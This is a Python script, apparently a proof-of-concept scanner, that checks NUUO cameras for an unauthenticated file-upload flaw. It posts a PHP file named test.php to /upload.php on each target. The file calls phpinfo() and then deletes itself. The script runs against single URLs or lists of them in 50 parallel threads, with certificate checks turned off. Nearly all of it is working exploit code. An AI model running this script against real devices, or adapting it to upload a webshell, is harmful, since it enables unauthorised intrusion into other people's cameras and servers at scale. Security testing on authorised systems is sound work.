import requests
import argparse
from multiprocessing.dummy import Pool
from urllib.parse import urlparse

requests.packages.urllib3.disable_warnings()


def is_valid_url(url):
    """验证URL格式是否正确"""
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except ValueError:
        return False


def check(target):
    url = f"{target}/upload.php"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW'
    }
    data = f"""------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="userfile"; filename="test.php"
Content-Type: text/x-php

<?php phpinfo();@unlink(__FILE__);?>
------WebKitFormBoundary7MA4YWxkTrZu0gW--"""
    try:
        response = requests.post(url=url, data=data, headers=headers, verify=False, timeout=10)
        if response.status_code == 200 and 'test.php' in response.text:
            print(f"[*] {target} Is Vulnerable")
        else:
            print(f"[!] {target} Not Vulnerable")
    except requests.exceptions.RequestException as e:
        print(f"[Error] {target} {e}")


def main():
    parse = argparse.ArgumentParser(description="NUUO摄像头文件上传漏洞检测")
    parse.add_argument('-u', '--url', dest='url', type=str, help='请输入单个URL')
    parse.add_argument('-f', '--file', dest='file', type=str, help='请输入包含多个URL的文件')
    args = parse.parse_args()

    pool = Pool(50)
    targets = []

    if args.url:
        if is_valid_url(args.url):
            targets.append(args.url)
        else:
            target = f"http://{args.url}"
            if is_valid_url(target):
                targets.append(target)
            else:
                print("[ERROR] 无效的URL格式")
                return
    elif args.file:
        try:
            with open(args.file, 'r') as f:
                for line in f:
                    target = line.strip()
                    if is_valid_url(target):
                        targets.append(target)
                    else:
                        target = f"http://{target}"
                        if is_valid_url(target):
                            targets.append(target)
                        else:
                            print(f"[WARNING] 无效的URL: {line.strip()}")
        except FileNotFoundError:
            print("[ERROR] 文件未找到")
            return
        except Exception as e:
            print(f"[ERROR] 读取文件时出错: {e}")
            return

    results = pool.map(check, targets)
    pool.close()
    pool.join()


if __name__ == '__main__':
    main()